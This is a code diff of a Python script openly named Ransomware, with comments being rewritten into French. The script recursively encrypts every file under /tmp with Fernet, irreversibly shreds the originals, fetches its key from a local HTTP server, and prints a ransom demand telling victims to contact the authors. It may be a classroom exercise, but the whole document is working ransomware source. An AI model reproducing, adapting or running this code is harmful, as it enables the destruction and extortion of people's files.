@@ -6,19 +6,21 @@ import http.server
 import requests
 import threading
 
+"""     A LIRE """
+
+
+
+"""     A LIRE """
+
 
 class Ransomware:
 
     def __init__(self, key=None):
         """
-        Initializes an instance of the Ransomware class.
+        Initialisation de la classe Ransomware
+        On utilise la même clé AES 128 pour chiffrer et déchiffrer
         
-        Args:
-            key: 128-bit AES key used to encrypt or decrypt files
-        
-        Attributes:
-            cryptor:fernet.Fernet: Object with encrypt and decrypt methods, set when key is generated if key is not passed 
-            file_ext_targets:list<str>: List of strings of allowed file extensions for encryption
+        Tous les fichiers, à savoir ceux qui sont nommés de la forme *.* sont concernés par le chiffrement.
         """
 
         self.key = key
@@ -26,21 +28,9 @@ class Ransomware:
         self.file_ext_targets = ["*"]
 
 
-    def generate_key(self):
-        """
-        Generates a 128-bit AES key for encrypting files. Sets self.cyptor with a Fernet object
-        """
-
-        self.key = Fernet.generate_key()
-        self.cryptor = Fernet(self.key)
-
-    
     def read_key(self, keyfile_name):
         """
-        Reads in a key from a file.
-
-        Args:
-            keyfile_name:str: Path to the file containing the key
+        Lis la clé dans le fichier keyfile_name
         """
 
         with open(keyfile_name, 'rb') as f:
@@ -50,9 +40,8 @@ class Ransomware:
 
     def write_key(self, keyfile_name):
         """
-        Writes the key to a keyfile
+        Ecrit la clé téléchargée dans le fichier keyfile_name
         """
-
         print(self.key)
         with open(keyfile_name, 'wb') as f:
             f.write(self.key)
@@ -61,58 +50,38 @@ class Ransomware:
     def crypt_tmp(self, tmp_dir, encrypted=False):
         """
         Recursively encrypts or decrypts files from tmp directory with allowed file extensions
+        Parcourt de façon récursive le dossier /tmp pour accéder à chaque fichier dans chaque sous dossier
+
 
         Args:
             tmp_dir:str: Absolute path of top level directory
             encrypt:bool: Specify whether to encrypt or decrypt encountered files
         """
 
-        """
-        for tmp, _, files in os.walk(tmp_dir):
-            for f in files:
-                abs_file_path = os.path.join(tmp, f)
 
-        """   
-        path ="/tmp/flo"
-        #we shall store all the file names in this list
-        filelist = []
+        path ="/tmp"
+
+        filelist = [] # On liste les chemins absolus de nos fichiers 
 
         for root, dirs, files in os.walk(path):
             for file in files:
-                #append the file name to the list
-                filelist.append(os.path.join(root,file))
+                filelist.append(os.path.join(root,file)) #ajoute le chemin absolu à la liste filelist []
 
-        #print all the file names
         for name in filelist:
-            self.crypt_file(name, encrypted=encrypted)
-                        
+            self.crypt_file(name, encrypted=encrypted) # chiffre tous les fichiers listés dans filelist []
 
-        """
-            # if not a file extension target
-                if not abs_file_path.split('.')[-1] in self.file_ext_targets:
-                    continue 
-        """
-            
-
-                #self.crypt_file(abs_file_path, encrypted=encrypted)
 
 
 
     def crypt_file(self, file_path, encrypted=False):
         """
-        Encrypts or decrypts a file
-
-        Args:
-            file_path:str: Absolute path to a file 
+        Ecrit le nouveau fichier chiffré dans la forme xxxx.enc
+        Sinon déchiffre le fichier xxxx.enc et l'écrit dans xxxx en enlevant .enc
         """
-
-
         if not encrypted:
             f = open(file_path, 'rb+')
             _data = f.read()
-            print(f'File contents pre encryption: {_data}')
             data = self.cryptor.encrypt(_data)
-            print(f'File contents post encryption: {data}')
             f_enc = open(file_path + ".enc", 'wb')
             f_enc.write(data)
             os.system("shred -v -z -u "+ file_path + " >/dev/null 2>&1")           
@@ -120,52 +89,41 @@ class Ransomware:
             f = open(file_path, 'rb+')
             _data = f.read()
             data = self.cryptor.decrypt(_data)
-            print(f'File content post decryption: {data}')
             f_dec = open(file_path.replace(".enc",""), 'wb')
             f_dec.write(data)
-            os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1")
+            os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1") # redirige les erreurs de la sortie std dans la corbeille
 
 
+
+
+"""
+    MAIN
+"""
 
 if __name__ == '__main__':
 
-    local_tmp = '/tmp' # emplacement dossier à chiffrer
-
-    #rware.generate_key()
-    #rware.write_key()
+    local_tmp = '/tmp' # emplacement du dossier à chiffrer
 
     import argparse
     parser = argparse.ArgumentParser()
-    parser.add_argument('--action')# , required=True
-    parser.add_argument('--keyfile')
-
+    parser.add_argument('--action') #1er type d'argument pour déchiffrer avec --action decrypt
+    parser.add_argument('--keyfile') #2ème type d'argument, pour placer la clé de déchiffrement avec --keyfile nom_de_la_clé
     args = parser.parse_args()
-    action = args.action #.lower()
-    keyfile = args.keyfile
-    
+    action = args.action
+    keyfile = args.keyfile    
     rware = Ransomware()
-
-    url = 'http://127.0.0.1:8080/keyfile.txt'
-        
-    keyfile = requests.get(url)
-
+    url = 'http://127.0.0.1:8080/keyfile.txt' # adresse de la clé sur le serveur hébergé en local   
+    keyfile = requests.get(url) # récupère la clé
     keyfile = keyfile.text
     
     if action == 'decrypt':
-        """
-        keyf = requests.get(url + "/keyfile", stream=True)
-        with open('keyfile', 'w') as fp:
-            fp.write(req.content)
-        """
         if keyfile is None:
             print('Veuillez spécifier le fichier de clé avec --keyfile')
         else:
             rware.read_key(keyfile)
             rware.crypt_tmp(local_tmp, encrypted=True)
-    else:
+    else: # si je ne déchiffre pas, je chiffre
 
-        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
-        
+        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VOS FICHIERS SERONT PERDUS.")    
         rware.read_key(keyfile)
-        rware.crypt_tmp(local_tmp)
-
+        rware.crypt_tmp(local_tmp) #lancement du chiffrement
